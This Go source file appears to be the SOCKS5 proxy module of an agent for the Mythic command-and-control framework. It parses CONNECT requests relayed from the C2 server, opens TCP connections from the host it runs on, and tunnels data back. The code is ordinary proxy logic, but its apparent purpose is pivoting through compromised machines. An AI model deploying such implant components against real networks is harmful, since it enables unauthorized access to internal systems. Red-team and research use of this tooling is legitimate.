package socks

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

const (
	socksVersion   = 0x05
	connectCommand = 0x01

	addrTypeIPv4   = 0x01
	addrTypeDomain = 0x03
	addrTypeIPv6   = 0x04

	replySuccess         = 0x00
	replyConnectionRefused = 0x05

	readBufSize = 32 * 1024 // 32KB per read
	dialTimeout = 10 * time.Second
)

// Manager handles all active SOCKS proxy connections
type Manager struct {
	connections map[uint32]net.Conn
	outbound    []structs.SocksMsg
	mu          sync.Mutex
}

// NewManager creates a new SOCKS connection manager
func NewManager() *Manager {
	return &Manager{
		connections: make(map[uint32]net.Conn),
	}
}

// DrainOutbound atomically returns all pending outbound SOCKS messages and clears the queue
func (m *Manager) DrainOutbound() []structs.SocksMsg {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.outbound) == 0 {
		return nil
	}
	msgs := m.outbound
	m.outbound = nil
	return msgs
}

// HandleMessages processes inbound SOCKS messages from Mythic
func (m *Manager) HandleMessages(msgs []structs.SocksMsg) {
	for _, msg := range msgs {
		if msg.Exit {
			m.closeConnection(msg.ServerId)
			continue
		}

		m.mu.Lock()
		conn, exists := m.connections[msg.ServerId]
		m.mu.Unlock()

		if exists {
			// Forward data to existing connection
			m.forwardData(msg.ServerId, conn, msg.Data)
		} else {
			// New connection — parse SOCKS5 CONNECT and establish TCP
			m.handleNewConnection(msg.ServerId, msg.Data)
		}
	}
}

// handleNewConnection parses a SOCKS5 CONNECT request and establishes a TCP connection
func (m *Manager) handleNewConnection(serverId uint32, b64Data string) {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil || len(data) < 4 {
		log.Printf("[SOCKS] Failed to decode initial data for server_id %d", serverId)
		m.queueExit(serverId)
		return
	}

	// Parse SOCKS5 CONNECT request (RFC 1928 §4)
	if data[0] != socksVersion || data[1] != connectCommand {
		log.Printf("[SOCKS] Invalid SOCKS5 CONNECT request for server_id %d (ver=%d cmd=%d)", serverId, data[0], data[1])
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	// Parse destination address
	addrType := data[3]
	var host string
	var portOffset int

	switch addrType {
	case addrTypeIPv4:
		if len(data) < 10 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = net.IP(data[4:8]).String()
		portOffset = 8
	case addrTypeDomain:
		if len(data) < 5 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		domainLen := int(data[4])
		if len(data) < 5+domainLen+2 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = string(data[5 : 5+domainLen])
		portOffset = 5 + domainLen
	case addrTypeIPv6:
		if len(data) < 22 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = net.IP(data[4:20]).String()
		portOffset = 20
	default:
		log.Printf("[SOCKS] Unsupported address type %d for server_id %d", addrType, serverId)
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	port := binary.BigEndian.Uint16(data[portOffset : portOffset+2])
	target := net.JoinHostPort(host, fmt.Sprintf("%d", port))

	// Establish TCP connection
	conn, err := net.DialTimeout("tcp", target, dialTimeout)
	if err != nil {
		log.Printf("[SOCKS] Failed to connect to %s for server_id %d: %v", target, serverId, err)
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	// Store the connection, closing any stale connection with the same server_id
	m.mu.Lock()
	if oldConn, exists := m.connections[serverId]; exists {
		oldConn.Close()
	}
	m.connections[serverId] = conn
	m.mu.Unlock()

	// Send success reply
	m.sendReply(serverId, replySuccess)

	// Start reader goroutine to read from the TCP connection and queue outbound data
	go m.readFromConnection(serverId, conn)
}

// forwardData writes decoded SOCKS data to an active TCP connection
func (m *Manager) forwardData(serverId uint32, conn net.Conn, b64Data string) {
	if b64Data == "" {
		return
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		log.Printf("[SOCKS] Failed to decode data for server_id %d: %v", serverId, err)
		return
	}
	if _, err := conn.Write(data); err != nil {
		log.Printf("[SOCKS] Write failed for server_id %d: %v", serverId, err)
		m.closeConnection(serverId)
	}
}

// readFromConnection reads data from a TCP connection and queues it as outbound SOCKS messages
func (m *Manager) readFromConnection(serverId uint32, conn net.Conn) {
	buf := make([]byte, readBufSize)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverId,
				Data:     encoded,
				Exit:     false,
			})
			m.mu.Unlock()
		}
		if err != nil {
			if err != io.EOF {
				log.Printf("[SOCKS] Read error for server_id %d: %v", serverId, err)
			}
			// Connection closed or errored — send exit and clean up
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverId,
				Data:     "",
				Exit:     true,
			})
			delete(m.connections, serverId)
			m.mu.Unlock()
			conn.Close()
			return
		}
	}
}

// closeConnection closes a TCP connection and removes it from the map
func (m *Manager) closeConnection(serverId uint32) {
	m.mu.Lock()
	conn, exists := m.connections[serverId]
	if exists {
		delete(m.connections, serverId)
	}
	m.mu.Unlock()

	if exists {
		conn.Close()
	}
}

// sendReply queues a SOCKS5 reply message back to Mythic
func (m *Manager) sendReply(serverId uint32, replyCode byte) {
	// SOCKS5 reply: VER(1) REP(1) RSV(1) ATYP(1) BND.ADDR(4) BND.PORT(2)
	reply := []byte{socksVersion, replyCode, 0x00, addrTypeIPv4, 0, 0, 0, 0, 0, 0}
	encoded := base64.StdEncoding.EncodeToString(reply)

	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverId,
		Data:     encoded,
		Exit:     false,
	})
	m.mu.Unlock()
}

// queueExit queues an exit message for a server_id
func (m *Manager) queueExit(serverId uint32) {
	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverId,
		Data:     "",
		Exit:     true,
	})
	m.mu.Unlock()
}
